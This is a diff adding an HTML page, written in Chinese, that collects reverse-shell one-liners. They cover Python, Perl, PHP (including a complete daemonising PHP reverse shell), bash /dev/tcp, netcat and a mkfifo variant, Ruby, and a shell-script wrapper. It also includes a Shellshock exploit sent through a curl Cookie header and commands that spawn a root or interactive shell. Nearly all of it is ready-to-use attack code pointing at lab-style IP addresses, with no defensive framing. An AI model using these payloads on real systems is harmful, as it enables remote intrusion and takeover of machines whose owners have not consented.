@@ -1,0 +1,100 @@
+<!doctype html>
+<html>
+<head>
+<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>
+<title>反shell弹脚本</title>
+</head>
+<body><h1 id='反弹shell脚本'>反弹shell脚本</h1>
+<p>一、反弹shell的各种姿势</p>
+<ul>
+<li>python</li>
+
+</ul>
+<pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.1&quot;,4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
+
+</code></pre>
+<ul>
+<li>perl</li>
+
+</ul>
+<pre><code>perl -e &#39;use Socket;$i=&quot;10.10.14.23&quot;;$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
+
+</code></pre>
+<ul>
+<li>php</li>
+
+</ul>
+<pre><code>&lt;?php system(&#39;nc -e /bin/bash 10.10.14.6 4444&#39;)?&gt;  //html版 
+    
+&lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1&#39;&quot;);?&gt;    
+    
+php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;    //内置语言版
+    
+
+    
+// html无nc版
+&lt;?php set_time_limit (0); $VERSION = &quot;1.0&quot;; $ip = &quot;10.10.14.6&quot;; $port = 4444; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = &quot;uname -a; w; id; /bin/bash -i&quot;; $daemon = 0; $debug = 0; if (function_exists(&quot;pcntl_fork&quot;)) { $pid = pcntl_fork(); if ($pid == -1) { printit(&quot;ERROR: Cannot fork&quot;); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit(&quot;Error: Cannot setsid()&quot;); exit(1); } $daemon = 1; } else { printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;); } chdir(&quot;/&quot;); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(&quot;$errstr ($errno)&quot;); exit(1); } $descriptorspec = array(0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;), 1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;), 2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(&quot;ERROR: Cannot spawn shell&quot;); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(&quot;Successfully opened reverse shell to $ip:$port&quot;); while (1) { if (feof($sock)) { printit(&quot;ERROR: Shell connection terminated&quot;); break; } if (feof($pipes[1])) { printit(&quot;ERROR: Shell process terminated&quot;); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(&quot;SOCK READ&quot;); $input = fread($sock, $chunk_size); if ($debug) printit(&quot;SOCK: $input&quot;); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(&quot;STDOUT READ&quot;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(&quot;STDOUT: $input&quot;); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(&quot;STDERR READ&quot;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(&quot;STDERR: $input&quot;); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) {  if (!$daemon) { print &quot;$string\n&quot;; } } ?&gt;
+
+    
+
+</code></pre>
+<ul>
+<li>curl</li>
+
+</ul>
+<pre><code>`curl -H &#39;Cookie: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.23/4443 0&gt;&amp;1&#39; http://10.10.10.56/cgi-bin/user.sh`
+
+</code></pre>
+<ul>
+<li>bash</li>
+
+</ul>
+<pre><code>/bash -i &gt;&amp; /dev/tcp/10.10.14.23/4444 0&gt;&amp;1
+
+</code></pre>
+<ul>
+<li>nc</li>
+
+</ul>
+<pre><code>nc -e /bin/sh 10.0.0.1 1234
+
+//若是机器上安装的nc版本没有-e选项
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
+
+</code></pre>
+<ul>
+<li>Ruby</li>
+
+</ul>
+<pre><code>//依赖/bin/sh:
+ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;
+
+//不依赖：
+ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;
+
+</code></pre>
+<ul>
+<li>sh文件</li>
+
+</ul>
+<pre><code>echo -e &#39;#!/bin/bash\n\nbash -i &gt;&amp; /dev/tcp/10.10.14.2/4445 0&gt;&amp;1&#39; &gt; xxx.sh
+bash xxx.sh
+
+</code></pre>
+<p>二、调取shell的各种方式</p>
+<ul>
+<li>perl</li>
+
+</ul>
+<pre><code>/usr/bin/perl -e &#39;use POSIX (setuid); POSIX::setuid(0); exec &quot;/bin/bash&quot;;&#39;
+
+</code></pre>
+<ul>
+<li>python （获取交互式shell）</li>
+
+</ul>
+<pre><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+
+</code></pre>
+</body>
+</html>
